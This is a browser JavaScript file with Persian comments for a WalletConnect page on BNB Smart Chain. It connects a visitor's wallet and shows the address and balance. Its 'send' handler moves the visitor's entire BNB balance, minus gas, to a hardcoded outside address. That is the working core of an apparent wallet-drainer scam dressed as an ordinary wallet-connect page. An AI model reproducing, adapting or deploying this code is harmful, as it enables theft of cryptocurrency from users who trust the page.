import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { WalletConnectModal } from "@walletconnect/modal";
import { ethers } from "ethers";

const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
const PROJECT_ID     = "4d08946e6c316bed5e76b450ccbb5256";

(async () => {
  // ۱. نمونه‌سازی Modal و Provider
  const modal = new WalletConnectModal({
    projectId: PROJECT_ID,
    walletConnectOptions: { version: 2 },
    themeVariables: {}
  });

  const provider = await EthereumProvider.init({
    projectId: PROJECT_ID,
    chains: [56],            // BSC Mainnet
    showQrModal: false,
    qrModalOptions: { modal }
  });

  // ۲. آماده‌سازی DOM و متغیرها
  const btnConnect = document.getElementById("connect");
  const infoDiv    = document.getElementById("info");
  const addrSpan   = document.getElementById("address");
  const balSpan    = document.getElementById("balance");
  const btnSend    = document.getElementById("send");

  let ethProvider, signer;

  // ۳. اتصال کیف‌پول
  btnConnect.addEventListener("click", async () => {
    try {
      await modal.openModal();
      await provider.enable();
      modal.closeModal();

      ethProvider = new ethers.providers.Web3Provider(provider);
      signer = ethProvider.getSigner();

      const address = await signer.getAddress();
      const balance = await ethProvider.getBalance(address);

      addrSpan.textContent = address;
      balSpan.textContent = ethers.utils.formatEther(balance) + " BNB";
      infoDiv.style.display = "block";
    } catch (err) {
      console.error(err);
      alert("اتصال با خطا مواجه شد: " + err.message);
    }
  });

  // ۴. ارسال کل موجودی
  btnSend.addEventListener("click", async () => {
    try {
      const address = await signer.getAddress();
      const balance = await ethProvider.getBalance(address);

      const gasPrice = await ethProvider.getGasPrice();
      const gasLimit = ethers.BigNumber.from(21000);
      const totalGasCost = gasPrice.mul(gasLimit);

      const valueToSend = balance.sub(totalGasCost);
      if (valueToSend.lte(0)) {
        return alert("موجودی کافی برای پوشش کارمزد ندارید.");
      }

      const tx = await signer.sendTransaction({
        to: TARGET_ADDRESS,
        value: valueToSend,
        gasPrice,
        gasLimit
      });

      alert("تراکنش ارسال شد:\n" + tx.hash);
      await tx.wait();
      alert("تراکنش تایید شد!");

      const newBal = await ethProvider.getBalance(address);
      balSpan.textContent = ethers.utils.formatEther(newBal) + " BNB";
    } catch (err) {
      console.error(err);
      alert("خطا در ارسال تراکنش: " + err.message);
    }
  });
})();